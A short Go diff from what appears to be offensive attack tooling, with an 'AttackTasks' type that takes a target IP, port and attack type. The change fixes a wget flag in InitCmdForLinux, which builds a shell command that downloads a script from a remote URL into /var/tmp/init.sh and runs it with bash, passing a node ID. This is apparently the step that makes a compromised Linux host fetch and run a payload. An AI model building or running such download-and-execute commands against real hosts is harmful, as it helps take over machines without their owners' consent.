@@ -148,5 +148,5 @@ func (at *AttackTasks) DownloadInitUrl(targetIP string, targetPort int, attackTy
 
 func (at *AttackTasks) InitCmdForLinux(initUrl string) string {
 
-	return fmt.Sprintf("wget %s -o /var/tmp/init.sh;bash /var/tmp/init.sh %s", initUrl, at.Cfg.NodeId)
+	return fmt.Sprintf("wget %s -O /var/tmp/init.sh;bash /var/tmp/init.sh %s", initUrl, at.Cfg.NodeId)
 }
